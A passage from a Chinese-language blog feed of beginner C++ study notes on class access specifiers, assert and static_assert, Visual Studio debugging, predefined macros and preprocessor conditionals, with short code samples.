class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">ROLE</span>&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="type">int</span> hp;</span><br><span class="line"><span class="type">int</span> mp;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    <span class="type">int</span> hpadd;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="type">int</span> damage;</span><br><span class="line"><span class="type">int</span> diamond;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>因为还是处于<code>public:</code>下所以还是能够被外部访问，但是不是很建议这么写，太麻烦了。</p><hr><h1 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h1><p>简单过一遍封装继承多态的概念，和class创建的方式。</p>]]></content>
      
      
      <categories>
          
          <category> cpp学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> cpp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【编译器角度】assert</title>
      <link href="/2022/06/18/assert/"/>
      <url>/2022/06/18/assert/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>assert, 翻译可能是断言，本质是个宏定义，不是函数<br>在C++中要使用assert需要将头文件&lt;cassert&gt;引入，虽然cassert本质上引用的是&lt;assert.h&gt;</p><span id="more"></span><p>它的作用在其他语言中是一样的，就是说如果他里面的条件返回错误，代码会终止运行并且将源文件以及错误的代码和行号都输出出来。</p><hr><h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h1><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;cassert&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="built_in">assert</span>(<span class="literal">false</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><img src="/2022/06/18/assert/000.png" class=""><p>弹出的类似这样。</p><p>像一些特殊场景我们想要输入的时候不为0，以便参与下一次运算。当然debug模式和release模式情况可能稍有不同，因为release模式下会自动屏蔽掉assert的功能。<br>但是通过assert在debug下直接弹出一个警告框效果也不错。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;cassert&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="type">int</span> x;</span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;请输入一个数:&quot;</span>;</span><br><span class="line">std::cin &gt;&gt; x;</span><br><span class="line"><span class="built_in">assert</span>(x);</span><br><span class="line">std::cout &lt;&lt; <span class="number">1000</span> / x;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><img src="/2022/06/18/assert/001.png" class=""><p>这其实跟try一个异常有些许类似。</p><p>重试的话就是重新运行，忽略的话下面的cout还是有问题会打断。结束就是结束运行了。</p><blockquote><p>应用场景远不止仅限于此。</p></blockquote><hr><p>屏蔽assert的话，可以定义一个宏。<br><code>#define NDEBUG</code></p><p>但是宏定义需要在引入头文件&lt;cassert&gt;之前。否则按顺序展开的话不起作用。<br>用这个的原因也是因为有的时候不需要去看这个异常，一般这种都是为了debug调试用的。</p><img src="/2022/06/18/assert/002.png" class=""><p>转到定义后，可以看到其实也是利用了一些编译器提供好的功能</p><hr><h2 id="static-assert"><a href="#static-assert" class="headerlink" title="static_assert"></a>static_assert</h2><p>static_assert 用于编译时检查条件<br><code>static_assert(bool表达式，”错误信息“);</code></p><p>c++17的新语法中：<br><code>static_assert(bool表达式);</code><br>与assert不同，static_assert主要是用来在编译时检查重要的条件<br>因此检查的bool表达式中，只能用于</p><blockquote><p>static_assert不需要头文件cassert</p></blockquote><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">static_assert</span>(<span class="number">0</span>, <span class="string">&quot;this is 0&quot;</span>);</span><br></pre></td></tr></table></figure><img src="/2022/06/18/assert/003.png" class=""><p><strong>注意，表达式的位置必须是常量或者表达式</strong></p><p>如果想用它判断编译环境，比如x86还是x64 可以用之前预定义的宏</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">static_assert</span>(_WIN32, <span class="string">&quot;this is 0&quot;</span>);</span><br></pre></td></tr></table></figure><p>像这种情况，我们处于x86模式编译自然会通过。如果改成<code>_WIN64</code>的话</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">static_assert</span>(_WIN64, <span class="string">&quot;this is 0&quot;</span>);</span><br></pre></td></tr></table></figure><p>在x86下，会提示未定义：</p><img src="/2022/06/18/assert/004.png" class=""><p>改成x64运行就没问题了。</p><p>当然这个属于msvc的预定义宏，想要更直观的，也可以通过sizeof看指针的大小去判断环境</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">static_assert</span>(<span class="built_in">sizeof</span>(<span class="type">int</span>*)==<span class="number">4</span>, <span class="string">&quot;it&#x27;s not 4&quot;</span>);</span><br></pre></td></tr></table></figure><p>在x86下 指针大小是四字节所以没问题<br>如果是x64下 指针大小占用八字节 所以会报错。</p><img src="/2022/06/18/assert/005.png" class=""><hr><h1 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h1><p>那么相比较之下，<code>static_assert</code>似乎还好用点，也不用引用头文件就能调用，而且debug的时候不一定需要这种弹窗效果，能产生报错信息不错了。</p>]]></content>
      
      
      <categories>
          
          <category> cpp学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> cpp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【编译器角度】debug</title>
      <link href="/2022/06/18/debug/"/>
      <url>/2022/06/18/debug/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>对于编写好的程序，或多或少可能存在bug和错误，简单语法上的问题编译器能够直接给出提示，而对于逻辑上出现的错误，编译器是不能直接发现的。所以就有了debug调试的过程。</p><span id="more"></span><hr><h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h1><p>为了方便调试，我们希望在编程风格上</p><ol><li>模块化</li><li>使用有意义的变量名和函数名</li><li>控制缩进，首尾呼应</li><li>良好的注释习惯</li></ol><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">inculde 《stido.h》</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">mian</span><span class="params">()</span>&#123;</span><br><span class="line">    print(<span class="string">&quot;hello world&quot;</span>);</span><br><span class="line"></span><br><span class="line">    retrunt <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>像这种。。字面上的错误都算是语法问题，编译器一下子就能找到问题，人眼也能看到。。这种其实就不算什么bug</p><p>而逻辑错误：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> ch[][<span class="number">3</span>]=&#123;</span><br><span class="line">    &#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>&#125;,</span><br><span class="line">    &#123;<span class="number">4</span>,<span class="number">5</span>,<span class="number">7</span>&#125;,</span><br><span class="line">    &#123;<span class="number">8</span>,<span class="number">9</span>,<span class="number">10</span>&#125;,</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这一种由程序生成后，看到其实不是按照预期结果从1-9的，在其中一个地方发生了什么导致跳过了，这种问题他不影响运行，但是与我们预期结果不符合，就可以说是一种逻辑错误。</p><hr><h2 id="模块化"><a href="#模块化" class="headerlink" title="模块化"></a>模块化</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">add</span><span class="params">(<span class="type">int</span> a,<span class="type">int</span> b)</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> a+b;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>一些重复性的功能用函数解决，这就是模块化，他可以减少重复操作导致的代码量。</p><hr><h2 id="有意义的名称"><a href="#有意义的名称" class="headerlink" title="有意义的名称"></a>有意义的名称</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> a,b,c;</span><br><span class="line"><span class="type">int</span> num,sum,add;</span><br></pre></td></tr></table></figure><p>做测试可能随便一点，但是如果看到这个变量名或者函数名我就能猜到它是干什么的。那么对于团队协作会提升很大效率。</p><hr><h2 id="缩进"><a href="#缩进" class="headerlink" title="缩进"></a>缩进</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="literal">true</span>)</span><br><span class="line">    <span class="keyword">if</span>(<span class="literal">true</span>)</span><br><span class="line"><span class="keyword">else</span></span><br></pre></td></tr></table></figure><p>像这种情况，if和else不对齐，或者乱对齐，无法准确的表达出意思就会让人很反感。<br>如果说else的内容是要给第二个if对齐，你这样写就很不合理。</p><hr><h2 id="注释"><a href="#注释" class="headerlink" title="注释"></a>注释</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">add</span><span class="params">(<span class="type">int</span> x,<span class="type">int</span> b)</span></span>; <span class="comment">//这是一个求两个数之和的函数</span></span><br></pre></td></tr></table></figure><p>虽然这个函数名比较简单通过形参也知道大概就是求和的，那么增加一行注释会有更直观的感想。</p><hr><h2 id="调试器"><a href="#调试器" class="headerlink" title="调试器"></a>调试器</h2><p>如果用过mingw，应该知道有gcc&#x2F;g++ 和调试工具 gdb<br>用过黑苹果 所以知道一个 clang，调试器是啥不知道，就观望了一下<br>然后vs2019这种ide 用的都是微软自己弄的，应该也是叫msvcdbg吧好像。</p><p>原理都差不多，应该是在基础上增加了什么功能，毕竟最常见就是打断点分析</p><img src="/2022/06/18/debug/000.png" class=""><p>打完断点后运行的时候程序就会停在断点处，这个时候ide就会多了值和内存什么的分析。</p><img src="/2022/06/18/debug/001.png" class=""><img src="/2022/06/18/debug/002.png" class=""><p>逐语句就是单步递增往下走。他进入函数之后也是一步步调试</p><p>而逐过程则稍微有点区别</p><img src="/2022/06/18/debug/004.png" class=""><p>它的作用就是跑到函数的时候不进去单步走直接执行完这个函数</p><p>还有个跳出<img src="/2022/06/18/debug/005.png" class=""><br>顾名思义也就是跳出某个函数</p><blockquote><p>且断点不只是在程序跑之前设置，跑的时候也可以设置。</p></blockquote><p>反汇编就很直接，可以从打断点的语句后面右击直接转到反汇编</p><img src="/2022/06/18/debug/003.png" class=""><p>也可以调试-窗口-反汇编，都行怎么习惯怎么来。<br>反汇编就更偏底层了，正常的调试可能还是源文件页面调。</p><p><strong>感觉这个调试不好讲，有时间还是看视频理解吧</strong></p><hr><h2 id="其他调试器"><a href="#其他调试器" class="headerlink" title="其他调试器"></a>其他调试器</h2><p>这些个可能都是干坏事用的，比如</p><ol><li>0llyDbg</li><li>x96Dbg</li><li>WinDbg</li></ol><p>比如~歪瓜，会检索一些属性之类的。</p><hr><h2 id="ifdef"><a href="#ifdef" class="headerlink" title="ifdef"></a>ifdef</h2><p>预处理指令可以根据定义宏去考虑要不要输出调试信息。<br>跟之前用法类似，就不演示了。</p><hr><h1 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h1><p>debug不好操作，估计还是得录视频会好操作表示点。</p>]]></content>
      
      
      <categories>
          
          <category> cpp学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> cpp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【编译器角度】预定义宏</title>
      <link href="/2022/06/17/Predefined/"/>
      <url>/2022/06/17/Predefined/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>在.c和.cpp混用的时候，注意到了它们在处理函数的时候有所不同<br>然后通过<code>#ifndef _cplusplus</code>去规避。那么这个<code>_cplusplus</code>就是c++的预定义宏</p><span id="more"></span><hr><h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h1><h2 id="func"><a href="#func" class="headerlink" title="func"></a>func</h2><p><code>__func__</code><br>编译器支持iso c99和iso c++11指定的预定义标识符<br>它的作用就是代表函数的名称</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">hhh</span><span class="params">()</span></span>&#123;</span><br><span class="line">std::cout &lt;&lt; __func__ &lt;&lt; <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">std::cout &lt;&lt; __func__ &lt;&lt; <span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="built_in">hhh</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><img src="/2022/06/17/Predefined/000.png" class=""><p>这种替换成函数名的操作，适用于debug的时候给函数做标记，看看是卡在哪个函数了。</p><hr><h2 id="标准预定义宏"><a href="#标准预定义宏" class="headerlink" title="标准预定义宏"></a>标准预定义宏</h2><table><thead><tr><th>宏</th><th>说明</th></tr></thead><tbody><tr><td><code>__DATE__</code></td><td>源文件的编译器日期</td></tr><tr><td><code>__TIME__</code></td><td>当前转换单元的转换时间</td></tr><tr><td><code>__FILE__</code></td><td>源文件的名称</td></tr><tr><td><code>__LINE__</code></td><td>当前的行号</td></tr><tr><td><code>__cplusplus</code></td><td>当翻译单元为c++时，__cplusplus定义为一个整数文本，否则未定义。</td></tr></tbody></table><blockquote><p>编译器支持iso c99和iso c++11指定的预定义标识符<br>老样子都是这个标准开始。</p></blockquote><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">std::cout &lt;&lt; __func__ &lt;&lt; <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">std::cout &lt;&lt; __DATE__ &lt;&lt; <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">std::cout &lt;&lt; __TIME__ &lt;&lt; <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">std::cout &lt;&lt; __FILE__ &lt;&lt; <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">std::cout &lt;&lt; __cplusplus &lt;&lt; <span class="string">&quot;\n&quot;</span>;</span><br></pre></td></tr></table></figure><p>可以自己打印玩玩：<img src="/2022/06/17/Predefined/001.png" class=""></p><p>这里的cplusplus按照设计应该是输出当前所使用的c++标准，比如年和月，但这里可能没做什么处理，都是197711.<br>不过也够区分c和c++了。</p><hr><h2 id="msvc预定义宏"><a href="#msvc预定义宏" class="headerlink" title="msvc预定义宏"></a>msvc预定义宏</h2><table><thead><tr><th>宏</th><th>说明</th></tr></thead><tbody><tr><td><code>_CHAR_UNSIGNED</code></td><td>如果char类型为无符号，则该定义为1，否则未定义</td></tr><tr><td><code>__COUNTER__</code></td><td>从0开始，每次使用都会递增1</td></tr><tr><td><code>_DEBUG</code></td><td>如果设置了&#x2F;lDd&#x2F;mDd&#x2F;mTd 则该定义为1，否则未定义</td></tr><tr><td><code>__FUNCTION__</code></td><td>函数名称 不含修饰符</td></tr><tr><td><code>__FUNCDNAME__</code></td><td>函数名称 包含修饰符</td></tr><tr><td><code>__FUNCSIG__</code></td><td>包含了函数签名的函数名</td></tr><tr><td><code>_WIN32</code></td><td>当编译为32位ARM、64位ARM、X86或X64定义为1，否则未定义</td></tr><tr><td><code>_WIN64</code></td><td>当编译为64位ARM或者X64定义为1，否则未定义</td></tr><tr><td><code>__TIMESTAMP__</code></td><td>最后一次源代码修改时间和日期</td></tr></tbody></table><p>除了c++标准预定义的宏，一些大的ide也会在编译器内置一些预定义宏，就拿vs来说。</p><hr><h3 id="CHAR-UNSIGNED"><a href="#CHAR-UNSIGNED" class="headerlink" title="_CHAR_UNSIGNED"></a>_CHAR_UNSIGNED</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _CHAR_UNSIGNED</span></span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;unsigned char\n&quot;</span>;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span> </span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><img src="/2022/06/17/Predefined/002.png" class=""><p>能看到没有设置无符号的char时他是灰色的不起作用。<br>判断字符有无符号，同样可以实现两种不同的效果。</p><hr><h3 id="COUNTER"><a href="#COUNTER" class="headerlink" title="__COUNTER__"></a>__COUNTER__</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    __COUNTER__;</span><br><span class="line">    std::cout &lt;&lt; __COUNTER__ &lt;&lt; std::endl;</span><br><span class="line">    std::cout &lt;&lt; __COUNTER__ &lt;&lt; std::endl;</span><br><span class="line">    std::cout &lt;&lt; __COUNTER__ &lt;&lt; std::endl;</span><br><span class="line">    std::cout &lt;&lt; __COUNTER__ &lt;&lt; std::endl;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>像这种出现几次就会从0开始累计的，早的时候可能都还要设置一个变量累加，既然有预定义的宏直接用也不是不行。<br>但是也要注意只能在vs类的ide上才有效。</p><hr><h3 id="DEBUG"><a href="#DEBUG" class="headerlink" title="_DEBUG"></a>_DEBUG</h3><p>debug的场景可能比较多。因为咋样都要调试，可以在里面设置显示一些调试信息。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _DEBUG</span></span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;debug&quot;</span>;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span> <span class="comment">// _DEBUG</span></span></span><br></pre></td></tr></table></figure><img src="/2022/06/17/Predefined/003.png" class=""><p>明眼人就知道，这个debug就跟你项目上面设置的有关。如果是release模式，debug就失效了。</p><hr><h3 id="后面几个"><a href="#后面几个" class="headerlink" title="后面几个"></a>后面几个</h3><p>不常用。。自己随便试试就行了。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">   std::cout &lt;&lt; __FUNCTION__ &lt;&lt; std::endl;</span><br><span class="line">std::cout &lt;&lt; __FUNCDNAME__ &lt;&lt; std::endl;</span><br><span class="line">std::cout &lt;&lt; __FUNCSIG__ &lt;&lt; std::endl;</span><br></pre></td></tr></table></figure><img src="/2022/06/17/Predefined/004.png" class=""><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">hhh</span><span class="params">()</span></span>&#123;</span><br><span class="line">std::cout &lt;&lt; __func__ &lt;&lt; <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">std::cout &lt;&lt; __FUNCTION__ &lt;&lt; std::endl;</span><br><span class="line">std::cout &lt;&lt; __FUNCDNAME__ &lt;&lt; std::endl;</span><br><span class="line">std::cout &lt;&lt; __FUNCSIG__ &lt;&lt; std::endl;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可能main函数不明显</p><img src="/2022/06/17/Predefined/005.png" class=""><p>_WIN32 和 _WIN64 属于架构问题。<br>在vs ide上能指定x86和x64，_WIN64才是只有当项目是x64编译的时候才为1。</p><p>__TIMESTAMP__ 显示的比较全，年月日 小时分钟秒 星期几都会显示。</p><hr><h1 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h1><p><strong>除了标准预定义的宏可以通用，其他的编译器自己预定义的没有可移植性，所以用的时候要注意</strong></p>]]></content>
      
      
      <categories>
          
          <category> cpp学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> cpp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【编译器角度】预处理指令逻辑</title>
      <link href="/2022/06/17/preprocessing/"/>
      <url>/2022/06/17/preprocessing/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>预处理：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">pragma</span> once</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> xxx</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> xxx</span></span><br><span class="line"><span class="meta">#<span class="keyword">else</span> </span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br></pre></td></tr></table></figure><span id="more"></span><p>诸如此类命令。</p><hr><h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h1><h2 id="ifdef"><a href="#ifdef" class="headerlink" title="ifdef"></a>ifdef</h2><p>一般都出现在头文件。主要是为了防止重复。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _HH_</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br></pre></td></tr></table></figure><p>像这样在头文件定义后，除非源文件有<code>#define _HH_</code>不然里面的内容是无效的。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _HH_</span></span><br><span class="line">    ...</span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line">    ...</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br></pre></td></tr></table></figure><p>然后if与else配套传统，如果不存在，就还有一种结果。</p><hr><h2 id="ifndef"><a href="#ifndef" class="headerlink" title="ifndef"></a>ifndef</h2><p>最早可能用过这种，#ifndef是<code>&quot;if not defined&quot;</code>的简写。</p><p>在特殊场合多次包含中，可能会这么用</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">ifndef</span> _HH_</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _HH_</span></span><br><span class="line">...</span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br></pre></td></tr></table></figure><p>该段代码意思是：如果_HH_没有被定义，则重定义_HH_，即执行语句2、语句3;如果_HH_已经被定义，则直接跳过语句2、语句3，直接执行语句4…</p><p>当然这种处理方式就可以不用老实呆在头文件里，你可以放到源文件去处理一些事情</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">ifdef</span> UNICODE</span></span><br><span class="line"><span class="type">wchar_t</span> a;</span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line"><span class="type">char</span> a;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span>;</span></span><br></pre></td></tr></table></figure><p>像这种提前预定义编码环境的时候就可以规范一下格式</p><img src="/2022/06/17/preprocessing/000.png" class=""><img src="/2022/06/17/preprocessing/001.png" class=""><p>二者的区别就在于项目属性里更改使用的字符环境是能看到#ifdef反馈的高亮情况。</p><hr><h2 id="if"><a href="#if" class="headerlink" title="if"></a>if</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> VERSION 2</span></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> VERSION==2</span></span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">up</span><span class="params">()</span></span>;</span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">down</span><span class="params">()</span></span>;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br></pre></td></tr></table></figure><p>预处理的if虽然也能使用逻辑运算符，但是跟常规if相比，他毕竟是预处理的指令，不会被编译。<br>使用这种好处自然是针对项目开发时，没必要废弃旧版本，就有些人用老的，那么有些功能的实现就可能依赖老版本环境。</p><hr><h2 id="elif"><a href="#elif" class="headerlink" title="elif"></a>elif</h2><p>这个跟上面的if配套的，就是elseif一样的操作</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> VERSION 2</span></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> VERSION==1</span></span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">up</span><span class="params">()</span></span>;</span><br><span class="line"><span class="meta">#<span class="keyword">elif</span> VERSION==2</span></span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">stop</span><span class="params">()</span></span>;</span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">down</span><span class="params">()</span></span>;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br></pre></td></tr></table></figure><p>实际上也就是更精确控制，但是绝大部分下应该用不了这么多。<br>除此之外就是既然可以使用基本的逻辑表达式，所以相对的基本的加减去改变自然也行得通</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> VERSION 2</span></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> VERSION==1+2 <span class="comment">// #if VERSION==1 || VERSION==3 。&amp;&amp;自然没问题</span></span></span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">up</span><span class="params">()</span></span>;</span><br><span class="line"><span class="meta">#<span class="keyword">elif</span> VERSION==2</span></span><br><span class="line">    <span 